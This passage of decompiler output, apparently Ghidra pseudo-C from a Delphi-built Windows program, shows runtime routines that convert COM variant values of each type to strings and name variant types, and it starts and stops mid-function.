  FUN_004042e4(param_2,local_18);
  *in_FS_OFFSET = &local_14;
  FUN_0040dbc8(&local_14,&local_14,(int *)0x400);
  return;
}



void FUN_0040e134(VARIANTARG *param_1,LPSTR *param_2)

{
  int *extraout_ECX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStackY_28;
  undefined *puStackY_24;
  int *piVar1;
  VARIANTARG local_14;
  
  piVar1 = (int *)&stack0xfffffffc;
  puStackY_24 = (undefined *)0x40e149;
  VariantInit(&local_14);
  puStackY_24 = &LAB_0040e18a;
  uStackY_28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStackY_28;
  FUN_0040def0(&local_14,param_1,extraout_ECX);
  (*DAT_00419810)(&local_14);
  FUN_0040e21c(param_2,(ushort *)&local_14);
  *in_FS_OFFSET = uStackY_28;
  puStackY_24 = (undefined *)0x40e189;
  FUN_0040dbc8(&local_14,uStackY_28,piVar1);
  return;
}



uint FUN_0040e198(undefined2 *param_1,int *param_2)

{
  int *piVar1;
  uint uVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStackY_30;
  int *piStackY_2c;
  VARIANTARG local_20;
  int *local_10;
  char local_9;
  int *local_8;
  
  if (param_2 != (int *)0x0) {
    *param_2 = 0;
  }
  local_8 = param_2;
  uVar2 = FUN_0040f484(CONCAT22((short)((uint)param_2 >> 0x10),*param_1),&local_10);
  local_9 = (char)uVar2;
  if (local_9 != '\0') {
    piStackY_2c = (int *)0x40e1cc;
    VariantInit(&local_20);
    piStackY_2c = (int *)&LAB_0040e20d;
    uStackY_30 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStackY_30;
    (**(code **)(*local_10 + 0x1c))(local_10,&local_20,param_1);
    FUN_004040b0(local_8,(undefined4 *)local_20.n1._8_4_);
    piVar1 = piStackY_2c;
    *in_FS_OFFSET = 0x100;
    piStackY_2c = (int *)0x40e214;
    uStackY_30 = 0x40e20c;
    uVar2 = FUN_0040dbc8(&local_20,0x100,piVar1);
    return uVar2;
  }
  return uVar2;
}



void FUN_0040e21c(LPSTR *param_1,ushort *param_2)

{
  ushort uVar1;
  int *piVar2;
  uint uVar3;
  int iVar4;
  undefined uVar5;
  undefined4 *unaff_EBX;
  undefined4 *unaff_ESI;
  LPCWSTR *in_FS_OFFSET;
  undefined4 *local_7c;
  undefined4 *local_78;
  undefined4 *local_74;
  undefined4 *local_70;
  undefined4 *local_6c;
  undefined4 *local_68;
  undefined4 *local_64;
  LPCWSTR local_60;
  LPCWSTR local_5c;
  LPCWSTR local_58;
  undefined4 *local_54;
  undefined4 *local_50;
  undefined4 *local_4c;
  undefined4 *local_48;
  undefined4 *local_44;
  undefined4 *local_40;
  undefined4 *local_3c;
  undefined4 *local_38;
  undefined4 *local_34;
  undefined4 *local_30;
  undefined4 *in_stack_ffffffd4;
  LPCWSTR in_stack_ffffffd8;
  LPCWSTR *ppWVar6;
  LPCWSTR local_20;
  LPCWSTR local_1c;
  BSTR local_18;
  undefined4 *local_c;
  undefined4 *local_8;
  
  local_18 = (BSTR)&stack0xfffffffc;
  iVar4 = 0xf;
  do {
    local_8 = (undefined4 *)0x0;
    iVar4 = iVar4 + -1;
  } while (iVar4 != 0);
  local_1c = (LPCWSTR)&LAB_0040e753;
  local_20 = *in_FS_OFFSET;
  *in_FS_OFFSET = (LPCWSTR)&local_20;
  uVar1 = *param_2;
  uVar5 = (undefined)uVar1;
  switch(uVar1) {
  case 0:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_0040405c((int *)param_1);
    break;
  case 1:
    local_18 = (BSTR)&stack0xfffffffc;
    if ((char)PTR_LAB_00418318 != '\0') {
      local_18 = (BSTR)&stack0xfffffffc;
      FUN_0040d47c(1,0x100);
    }
    FUN_004040b0((int *)param_1,DAT_0041831c);
    break;
  case 2:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_0040725c((int)(short)param_2[4],(int *)&local_8);
    FUN_004040b0((int *)param_1,local_8);
    break;
  case 3:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_0040725c(*(uint *)(param_2 + 4),(int *)&local_c);
    FUN_004040b0((int *)param_1,local_c);
    break;
  case 4:
    local_30 = (undefined4 *)0x40e324;
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_004086e4((int *)&stack0xfffffff0,uVar5,0,SUB101((float10)*(float *)(param_2 + 4),0));
    FUN_004040b0((int *)param_1,unaff_EBX);
    break;
  case 5:
    local_30 = (undefined4 *)0x40e345;
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_004086e4((int *)&stack0xffffffec,uVar5,0,SUB101((float10)*(double *)(param_2 + 4),0));
    FUN_004040b0((int *)param_1,unaff_ESI);
    break;
  case 6:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_0040df34(&local_18,uVar5,0,*(undefined4 *)(param_2 + 4),*(undefined4 *)(param_2 + 6));
    FUN_004042e4(param_1,local_18);
    break;
  case 7:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_0040df6c(&local_1c,uVar5,0,*(undefined4 *)(param_2 + 4),*(undefined4 *)(param_2 + 6));
    FUN_004042e4(param_1,local_1c);
    break;
  case 8:
    ppWVar6 = &local_20;
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_004047f4((BSTR *)&stack0xffffffdc,*(OLECHAR **)(param_2 + 4));
    FUN_004048e0((uint)ppWVar6,1,0x7fffffff,ppWVar6);
    FUN_004042e4(param_1,local_20);
    break;
  case 9:
  case 0xd:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_0040e068(param_2,(LPSTR *)&local_40);
    FUN_004040b0((int *)param_1,local_40);
    break;
  default:
    if (uVar1 == 0x100) {
      local_18 = (BSTR)&stack0xfffffffc;
      FUN_004040b0((int *)param_1,*(undefined4 **)(param_2 + 4));
    }
    else if ((ushort)(uVar1 - 0x101) == 0) {
      local_18 = (BSTR)&stack0xfffffffc;
      FUN_0040e134((VARIANTARG *)param_2,(LPSTR *)&local_44);
      FUN_004040b0((int *)param_1,local_44);
    }
    else if ((uVar1 & 0x4000) == 0) {
      local_18 = (BSTR)&stack0xfffffffc;
      piVar2 = FUN_0040405c((int *)param_1);
      uVar3 = FUN_0040e198(param_2,piVar2);
      if ((char)uVar3 == '\0') {
        FUN_0040e068(param_2,(LPSTR *)&local_7c);
        FUN_004040b0((int *)param_1,local_7c);
      }
    }
    else {
      uVar5 = (undefined)(uVar1 - 0x101);
      switch(uVar1 & 0xbfff) {
      default:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_0040e068(param_2,(LPSTR *)&local_78);
        FUN_004040b0((int *)param_1,local_78);
        break;
      case 2:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_0040725c((int)**(short **)(param_2 + 4),(int *)&local_48);
        FUN_004040b0((int *)param_1,local_48);
        break;
      case 3:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_0040725c(**(uint **)(param_2 + 4),(int *)&local_4c);
        FUN_004040b0((int *)param_1,local_4c);
        break;
      case 4:
        local_30 = (undefined4 *)0x40e58a;
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_004086e4((int *)&local_50,uVar5,0,SUB101((float10)**(float **)(param_2 + 4),0));
        FUN_004040b0((int *)param_1,local_50);
        break;
      case 5:
        local_30 = (undefined4 *)0x40e5ad;
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_004086e4((int *)&local_54,uVar5,0,SUB101((float10)**(double **)(param_2 + 4),0));
        FUN_004040b0((int *)param_1,local_54);
        break;
      case 6:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_0040df34(&local_58,uVar5,0,**(undefined4 **)(param_2 + 4),
                     (*(undefined4 **)(param_2 + 4))[1]);
        FUN_004042e4(param_1,local_58);
        break;
      case 7:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_0040df6c(&local_5c,uVar5,0,**(undefined4 **)(param_2 + 4),
                     (*(undefined4 **)(param_2 + 4))[1]);
        FUN_004042e4(param_1,local_5c);
        break;
      case 8:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_00404284(param_1,**(LPCWSTR **)(param_2 + 4));
        break;
      case 0xb:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_0040dfa4(CONCAT22((short)((uint)*(undefined2 **)(param_2 + 4) >> 0x10),
                              **(undefined2 **)(param_2 + 4)),&local_60);
        FUN_004042e4(param_1,local_60);
        break;
      case 0xc:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_0040e21c(param_1,*(ushort **)(param_2 + 4));
        break;
      case 0x10:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_0040725c((int)**(char **)(param_2 + 4),(int *)&local_64);
        FUN_004040b0((int *)param_1,local_64);
        break;
      case 0x11:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_0040725c((uint)**(byte **)(param_2 + 4),(int *)&local_68);
        FUN_004040b0((int *)param_1,local_68);
        break;
      case 0x12:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_0040725c((uint)**(ushort **)(param_2 + 4),(int *)&local_6c);
        FUN_004040b0((int *)param_1,local_6c);
        break;
      case 0x13:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_00407348((int *)&local_70,0,0,(char)**(undefined4 **)(param_2 + 4));
        FUN_004040b0((int *)param_1,local_70);
        break;
      case 0x14:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_00407348((int *)&local_74,uVar5,0,(char)**(undefined4 **)(param_2 + 4));
        FUN_004040b0((int *)param_1,local_74);
      }
    }
    break;
  case 0xb:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_0040dfa4((uint)param_2[4],(BSTR *)&stack0xffffffd8);
    FUN_004042e4(param_1,in_stack_ffffffd8);
    break;
  case 0xc:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_0040e21c(param_1,*(ushort **)(param_2 + 4));
    break;
  case 0x10:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_0040725c((int)*(char *)(param_2 + 4),(int *)&stack0xffffffd4);
    FUN_004040b0((int *)param_1,in_stack_ffffffd4);
    break;
  case 0x11:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_0040725c((uint)*(byte *)(param_2 + 4),(int *)&local_30);
    FUN_004040b0((int *)param_1,local_30);
    break;
  case 0x12:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_0040725c((uint)param_2[4],(int *)&local_34);
    FUN_004040b0((int *)param_1,local_34);
    break;
  case 0x13:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_00407348((int *)&local_38,0,0,(char)*(undefined4 *)(param_2 + 4));
    FUN_004040b0((int *)param_1,local_38);
    break;
  case 0x14:
    FUN_00407348((int *)&local_3c,uVar5,0,(char)*(undefined4 *)(param_2 + 4));
    FUN_004040b0((int *)param_1,local_3c);
  }
  *in_FS_OFFSET = local_20;
  local_18 = (BSTR)&LAB_0040e75a;
  local_1c = L"䖍몤\x03";
  FUN_00404080((int *)&local_7c,7);
  local_1c = L"䖍몰\v";
  FUN_004046fc(&local_60,3);
  local_1c = L"䖍뫜\x05";
  FUN_00404080((int *)&local_54,0xb);
  local_1c = L"䖍뫰\x04";
  FUN_004046fc((BSTR *)&stack0xffffffd8,5);
  local_1c = (BSTR)0x40e752;
  FUN_00404080((int *)&stack0xffffffec,4);
  return;
}



void FUN_0040e760(undefined2 *param_1,BSTR *param_2)

{
  DWORD DVar1;
  undefined2 extraout_var;
  undefined2 extraout_var_00;
  VARIANTARG **in_FS_OFFSET;
  undefined4 uStack_38;
  undefined4 uStack_34;
  undefined4 uStack_2c;
  undefined4 uStack_28;
  undefined4 uStack_24;
  BSTR local_18;
  VARIANTARG local_14;
  
  uStack_24 = &stack0xfffffffc;
  local_18 = (BSTR)0x0;
  uStack_28 = (ULONG)&LAB_0040e80a;
  uStack_2c = *in_FS_OFFSET;
  *in_FS_OFFSET = (VARIANTARG *)&stack0xffffffd4;
  uStack_34 = 0x40e788;
  VariantInit(&local_14);
  uStack_34 = (ULONG)&LAB_0040e7ed;
  uStack_38 = *in_FS_OFFSET;
  *in_FS_OFFSET = (VARIANTARG *)&stack0xffffffc8;
  DVar1 = (**(code **)PTR_DAT_00418684)();
  FUN_0040d8bc(DVar1,CONCAT22(extraout_var_00,*param_1),CONCAT22(extraout_var,8));
  FUN_004047f4(&local_18,(OLECHAR *)local_14.n1._8_4_);
  FUN_004048e0((uint)local_18,1,0x7fffffff,param_2);
  *in_FS_OFFSET = &local_14;
  FUN_0040dbc8(&local_14,&local_14,(int *)0x400);
  return;
}



void FUN_0040e818(VARIANTARG *param_1,BSTR *param_2)

{
  int *extraout_ECX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStackY_28;
  undefined *puStackY_24;
  int *piVar1;
  VARIANTARG local_14;
  
  piVar1 = (int *)&stack0xfffffffc;
  puStackY_24 = (undefined *)0x40e82d;
  VariantInit(&local_14);
  puStackY_24 = &LAB_0040e86e;
  uStackY_28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStackY_28;
  FUN_0040def0(&local_14,param_1,extraout_ECX);
  (*DAT_00419810)(&local_14);
  FUN_0040e944(param_2,(ushort *)&local_14);
  *in_FS_OFFSET = uStackY_28;
  puStackY_24 = (undefined *)0x40e86d;
  FUN_0040dbc8(&local_14,uStackY_28,piVar1);
  return;
}



void FUN_0040e87c(ushort *param_1,BSTR *param_2)

{
  int *piVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  BSTR *ppOVar3;
  undefined4 uStack_40;
  int *piStack_3c;
  undefined4 uStack_34;
  undefined *puStack_30;
  undefined *puStack_2c;
  BSTR local_24;
  VARIANTARG local_20;
  int *local_10;
  char local_9;
  BSTR *local_8;
  
  puStack_2c = &stack0xfffffffc;
  local_24 = (BSTR)0x0;
  if (param_2 != (BSTR *)0x0) {
    *param_2 = (BSTR)0x0;
  }
  puStack_30 = &LAB_0040e934;
  uStack_34 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_34;
  local_8 = param_2;
  iVar2 = FUN_0040f484((uint)*param_1,&local_10);
  local_9 = (char)iVar2;
  if (local_9 != '\0') {
    piStack_3c = (int *)0x40e8c3;
    VariantInit(&local_20);
    piStack_3c = (int *)&LAB_0040e917;
    uStack_40 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStack_40;
    (**(code **)(*local_10 + 0x1c))(local_10,&local_20,param_1);
    ppOVar3 = local_8;
    FUN_004047f4(&local_24,(OLECHAR *)local_20.n1._8_4_);
    FUN_004048e0((uint)local_24,1,0x7fffffff,ppOVar3);
    piVar1 = piStack_3c;
    *in_FS_OFFSET = 8;
    piStack_3c = (int *)0x40e91e;
    uStack_40 = 0x40e916;
    FUN_0040dbc8(&local_20,8,piVar1);
    return;
  }
  *in_FS_OFFSET = uStack_34;
  puStack_2c = &LAB_0040e93b;
  puStack_30 = (undefined *)0x40e933;
  FUN_004046e4(&local_24);
  return;
}



void FUN_0040e944(BSTR *param_1,ushort *param_2)

{
  ushort uVar1;
  char cVar2;
  BSTR *ppOVar3;
  undefined uVar4;
  LPCSTR unaff_EBX;
  OLECHAR *unaff_ESI;
  OLECHAR **in_FS_OFFSET;
  OLECHAR *local_78;
  OLECHAR *local_74;
  LPCSTR local_70;
  LPCSTR local_6c;
  LPCSTR local_68;
  LPCSTR local_64;
  LPCSTR local_60;
  OLECHAR *local_5c;
  OLECHAR *local_58;
  OLECHAR *local_54;
  LPCSTR local_50;
  LPCSTR local_4c;
  LPCSTR local_48;
  LPCSTR local_44;
  OLECHAR *local_40;
  OLECHAR *local_3c;
  LPCSTR local_38;
  LPCSTR local_34;
  LPCSTR in_stack_ffffffd0;
  LPCSTR in_stack_ffffffd4;
  undefined2 uVar5;
  undefined2 uVar6;
  OLECHAR *local_24;
  BSTR local_20;
  BSTR local_1c;
  LPCSTR local_10;
  LPCSTR local_c;
  LPCSTR local_8;
  
  local_1c = (BSTR)&stack0xfffffffc;
  local_10 = (LPCSTR)0xe;
  do {
    local_8 = (LPCSTR)0x0;
    local_10 = local_10 + -1;
  } while (local_10 != (LPCSTR)0x0);
  local_20 = (BSTR)&LAB_0040ee96;
  local_24 = *in_FS_OFFSET;
  *in_FS_OFFSET = (OLECHAR *)&local_24;
  uVar1 = *param_2;
  uVar4 = (undefined)uVar1;
  switch(uVar1) {
  case 0:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_004046e4(param_1);
    break;
  case 1:
    local_1c = (BSTR)&stack0xfffffffc;
    if ((char)PTR_LAB_00418318 != '\0') {
      local_1c = (BSTR)&stack0xfffffffc;
      FUN_0040d47c(1,8);
    }
    FUN_00404830(param_1,DAT_0041831c);
    break;
  case 2:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_0040725c((int)(short)param_2[4],(int *)&local_8);
    FUN_00404830(param_1,local_8);
    break;
  case 3:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_0040725c(*(uint *)(param_2 + 4),(int *)&local_c);
    FUN_00404830(param_1,local_c);
    break;
  case 4:
    local_34 = (LPCSTR)0x40ea4d;
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_004086e4((int *)&local_10,uVar4,0,SUB101((float10)*(float *)(param_2 + 4),0));
    FUN_00404830(param_1,local_10);
    break;
  case 5:
    local_34 = (LPCSTR)0x40ea6e;
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_004086e4((int *)&stack0xffffffec,uVar4,0,SUB101((float10)*(double *)(param_2 + 4),0));
    FUN_00404830(param_1,unaff_EBX);
    break;
  case 6:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_0040df34((BSTR *)&stack0xffffffe8,uVar4,0,*(undefined4 *)(param_2 + 4),
                 *(undefined4 *)(param_2 + 6));
    FUN_00404720(param_1,unaff_ESI);
    break;
  case 7:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_0040df6c(&local_1c,uVar4,0,*(undefined4 *)(param_2 + 4),*(undefined4 *)(param_2 + 6));
    FUN_00404720(param_1,local_1c);
    break;
  case 8:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_004047f4(&local_20,*(OLECHAR **)(param_2 + 4));
    FUN_004048e0((uint)local_20,1,0x7fffffff,param_1);
    break;
  case 9:
  case 0xd:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_0040e760(param_2,&local_3c);
    FUN_00404720(param_1,local_3c);
    break;
  default:
    if (uVar1 == 0x100) {
      local_1c = (BSTR)&stack0xfffffffc;
      FUN_00404830(param_1,*(LPCSTR *)(param_2 + 4));
    }
    else if ((ushort)(uVar1 - 0x101) == 0) {
      local_1c = (BSTR)&stack0xfffffffc;
      FUN_0040e818((VARIANTARG *)param_2,&local_40);
      FUN_00404720(param_1,local_40);
    }
    else if ((uVar1 & 0x4000) == 0) {
      local_1c = (BSTR)&stack0xfffffffc;
      ppOVar3 = FUN_004046e4(param_1);
      cVar2 = FUN_0040e87c(param_2,ppOVar3);
      if (cVar2 == '\0') {
        FUN_0040e760(param_2,&local_78);
        FUN_00404720(param_1,local_78);
      }
    }
    else {
      uVar4 = (undefined)(uVar1 - 0x101);
      switch(uVar1 & 0xbfff) {
      default:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_0040e760(param_2,&local_74);
        FUN_00404720(param_1,local_74);
        break;
      case 2:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_0040725c((int)**(short **)(param_2 + 4),(int *)&local_44);
        FUN_00404830(param_1,local_44);
        break;
      case 3:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_0040725c(**(uint **)(param_2 + 4),(int *)&local_48);
        FUN_00404830(param_1,local_48);
        break;
      case 4:
        local_34 = (LPCSTR)0x40eca6;
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_004086e4((int *)&local_4c,uVar4,0,SUB101((float10)**(float **)(param_2 + 4),0));
        FUN_00404830(param_1,local_4c);
        break;
      case 5:
        local_34 = (LPCSTR)0x40ecc9;
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_004086e4((int *)&local_50,uVar4,0,SUB101((float10)**(double **)(param_2 + 4),0));
        FUN_00404830(param_1,local_50);
        break;
      case 6:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_0040df34(&local_54,uVar4,0,**(undefined4 **)(param_2 + 4),
                     (*(undefined4 **)(param_2 + 4))[1]);
        FUN_00404720(param_1,local_54);
        break;
      case 7:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_0040df6c(&local_58,uVar4,0,**(undefined4 **)(param_2 + 4),
                     (*(undefined4 **)(param_2 + 4))[1]);
        FUN_00404720(param_1,local_58);
        break;
      case 8:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_004047f4(param_1,**(OLECHAR ***)(param_2 + 4));
        break;
      case 0xb:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_0040dfa4(CONCAT22((short)((uint)*(undefined2 **)(param_2 + 4) >> 0x10),
                              **(undefined2 **)(param_2 + 4)),&local_5c);
        FUN_00404720(param_1,local_5c);
        break;
      case 0xc:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_0040e944(param_1,*(ushort **)(param_2 + 4));
        break;
      case 0x10:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_0040725c((int)**(char **)(param_2 + 4),(int *)&local_60);
        FUN_00404830(param_1,local_60);
        break;
      case 0x11:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_0040725c((uint)**(byte **)(param_2 + 4),(int *)&local_64);
        FUN_00404830(param_1,local_64);
        break;
      case 0x12:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_0040725c((uint)**(ushort **)(param_2 + 4),(int *)&local_68);
        FUN_00404830(param_1,local_68);
        break;
      case 0x13:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_00407348((int *)&local_6c,0,0,(char)**(undefined4 **)(param_2 + 4));
        FUN_00404830(param_1,local_6c);
        break;
      case 0x14:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_00407348((int *)&local_70,uVar4,0,(char)**(undefined4 **)(param_2 + 4));
        FUN_00404830(param_1,local_70);
      }
    }
    break;
  case 0xb:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_0040dfa4((uint)param_2[4],&local_24);
    FUN_00404720(param_1,local_24);
    break;
  case 0xc:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_0040e944(param_1,*(ushort **)(param_2 + 4));
    break;
  case 0x10:
    uVar5 = 0xeb01;
    uVar6 = 0x40;
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_0040725c((int)*(char *)(param_2 + 4),(int *)&stack0xffffffd8);
    FUN_00404830(param_1,(LPCSTR)CONCAT22(uVar6,uVar5));
    break;
  case 0x11:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_0040725c((uint)*(byte *)(param_2 + 4),(int *)&stack0xffffffd4);
    FUN_00404830(param_1,in_stack_ffffffd4);
    break;
  case 0x12:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_0040725c((uint)param_2[4],(int *)&stack0xffffffd0);
    FUN_00404830(param_1,in_stack_ffffffd0);
    break;
  case 0x13:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_00407348((int *)&local_34,0,0,(char)*(undefined4 *)(param_2 + 4));
    FUN_00404830(param_1,local_34);
    break;
  case 0x14:
    FUN_00407348((int *)&local_38,uVar4,0,(char)*(undefined4 *)(param_2 + 4));
    FUN_00404830(param_1,local_38);
  }
  *in_FS_OFFSET = local_24;
  local_1c = (BSTR)&LAB_0040ee9d;
  local_20 = L"䖍몔\x05";
  FUN_004046fc(&local_78,2);
  local_20 = L"䖍모\x03";
  FUN_00404080((int *)&local_70,5);
  local_20 = L"䖍몴\x04";
  FUN_004046fc(&local_5c,3);
  local_20 = L"䖍뫄\x02";
  FUN_00404080((int *)&local_50,4);
  local_20 = L"䖍뫌\x05";
  FUN_004046fc(&local_40,2);
  local_20 = L"䖍뫠\x04";
  FUN_00404080((int *)&local_38,5);
  local_20 = L"䖍뫰\x04";
  FUN_004046fc(&local_24,4);
  local_20 = L"\xe9c3䯩\xffff郫孞\xe58b썝暐㢃爈：౰烿（Ѱヿ읦";
  FUN_00404080((int *)&stack0xffffffec,4);
  return;
}



void FUN_0040f028(uint param_1,int *param_2)

{
  int iVar1;
  ushort uVar2;
  undefined4 *in_FS_OFFSET;
  byte *pbVar4;
  undefined4 uStack_224;
  undefined *puStack_220;
  undefined *puStack_21c;
  undefined4 *local_20c;
  byte local_208 [256];
  byte local_108 [256];
  int *local_8;
  ushort uVar3;
  
  puStack_21c = &stack0xfffffffc;
  local_20c = (undefined4 *)0x0;
  puStack_220 = &LAB_0040f14e;
  uStack_224 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_224;
  uVar3 = (ushort)param_1;
  uVar2 = uVar3 & 0xfff;
  if (uVar2 < 0x15) {
    puStack_21c = &stack0xfffffffc;
    FUN_004040b0(param_2,(undefined4 *)(&PTR_s_Empty_00418328)[uVar2]);
  }
  else if (uVar3 == 0x100) {
    puStack_21c = &stack0xfffffffc;
    FUN_004040b0(param_2,(undefined4 *)s_String_0040f164);
  }
  else if (uVar3 == 0x101) {
    puStack_21c = &stack0xfffffffc;
    FUN_004040b0(param_2,(undefined4 *)&DAT_0040f174);
  }
  else {
    iVar1 = FUN_0040f484(param_1,&local_8);
    if ((char)iVar1 == '\0') {
      FUN_00407370((uint)uVar2,4,(int *)&local_20c);
      FUN_00404344(param_2,*(undefined4 **)PTR_PTR_DAT_004186b8,local_20c);
    }
    else {
      pbVar4 = local_108;
      FUN_00403520(*local_8,local_208);
      FUN_004027b4(local_208,2,0x7fffffff,pbVar4);
      FUN_004042c0(param_2,local_108);
    }
  }
  if ((param_1 & 0x2000) != 0) {
    FUN_00404344(param_2,(undefined4 *)s_Array_0040f180,(undefined4 *)*param_2);
  }
  if ((param_1 & 0x4000) != 0) {
    FUN_00404344(param_2,(undefined4 *)s_ByRef_0040f190,(undefined4 *)*param_2);
  }
  *in_FS_OFFSET = uStack_224;
  puStack_21c = &LAB_0040f155;
  puStack_220 = (undefined *)0x40f14d;
  FUN_0040405c((int *)&local_20c);
  return;
}



void FUN_0040f198(VARIANTARG *param_1,undefined4 param_2,int *param_3)

{
  FUN_0040dbc8(param_1,param_2,param_3);
  (param_1->n1).n2.vt = 10;
  *(undefined4 *)((int)&param_1->n1 + 8) = param_2;
  return;
}



void FUN_0040f1b0(VARIANTARG *param_1,undefined4 param_2,int *param_3)

{
  FUN_0040f198(param_1,0x80020004,param_3);
  return;
}



void FUN_0040f1e0(void)

{
  int *piVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStackY_18;
  
  EnterCriticalSection((LPCRITICAL_SECTION)&DAT_00419820);
  uStackY_18 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStackY_18;
  iVar2 = FUN_00404dcc(DAT_0041981c);
  iVar2 = iVar2 + -1;
  if (-1 < iVar2) {
    do {
      piVar1 = *(int **)(DAT_0041981c + iVar2 * 4);
      if (piVar1 != DAT_00418324) {
        FUN_004035a8(piVar1);
      }
      iVar2 = iVar2 + -1;
    } while (iVar2 != -1);
  }
  *in_FS_OFFSET = uStackY_18;
  uStackY_18 = 0x40f240;
  LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_00419820);
  return;
}



void FUN_0040f258(int param_1,undefined4 param_2,int *param_3)

{
  int iVar1;
  int *local_10;
  
  local_10 = param_3;
  iVar1 = FUN_0040f484(CONCAT22((short)((uint)param_1 >> 0x10),*(undefined2 *)param_3),&local_10);
  if ((char)iVar1 == '\0') {
    FUN_0040f404();
  }
  else {
    (**(code **)(*local_10 + 0x1c))(local_10,param_2,param_3,*(undefined2 *)(param_1 + 4));
  }
  return;
}



void FUN_0040f290(int param_1,undefined4 param_2,undefined2 *param_3,undefined4 param_4)

{
  int iVar1;
  int *local_c;
  undefined4 local_8;
  
  local_8 = param_2;
  if (((short)param_4 != *(short *)(param_1 + 4)) &&
     (iVar1 = FUN_0040f484(CONCAT22((short)((uint)param_1 >> 0x10),*param_3),&local_c),
     (char)iVar1 != '\0')) {
    (**(code **)(*local_c + 0x1c))(local_c,local_8,param_3,param_4);
    return;
  }
  FUN_0040f404();
  return;
}



void FUN_0040f2d8(void)

{
  FUN_0040f40c();
  return;
}



undefined FUN_0040f2e4(int *param_1,undefined4 param_2,uint param_3,int param_4)

{
  undefined4 uStack_8;
  
  uStack_8 = param_3;
  (**(code **)(*param_1 + 0x38))(param_1,param_2,param_3,(int)&uStack_8 + 3);
  return *(undefined *)(param_4 * 3 + 0x418352 + (uStack_8 >> 0x18));
}



undefined4 FUN_0040f3e8(int param_1,undefined4 param_2,undefined4 param_3,undefined2 *param_4)

{
  undefined2 uVar1;
  
  uVar1 = *(undefined2 *)(param_1 + 4);
  *param_4 = uVar1;
  return CONCAT31((int3)(CONCAT22((short)((uint)param_1 >> 0x10),uVar1) >> 8),1);
}



void FUN_0040f404(void)

{
  FUN_0040d428();
  return;
}



void FUN_0040f40c(void)

{
  FUN_0040d518();
  return;
}



void FUN_0040f414(void)

{
  FUN_0040d8f0();
  return;
}



undefined4 FUN_0040f444(void)

{
  return 0xffffffff;
}



int FUN_0040f484(uint param_1,undefined4 *param_2)

{
  bool bVar1;
  uint3 uVar3;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStackY_20;
  
  if (((DAT_0041981c == 0) || ((ushort)param_1 < 0x100)) || (0x7ff < (ushort)param_1)) {
    bVar1 = false;
    uVar3 = 0;
  }
  else {
    uVar3 = (uint3)(param_1 >> 8);
    bVar1 = true;
  }
  if (bVar1) {
    EnterCriticalSection((LPCRITICAL_SECTION)&DAT_00419820);
    uStackY_20 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStackY_20;
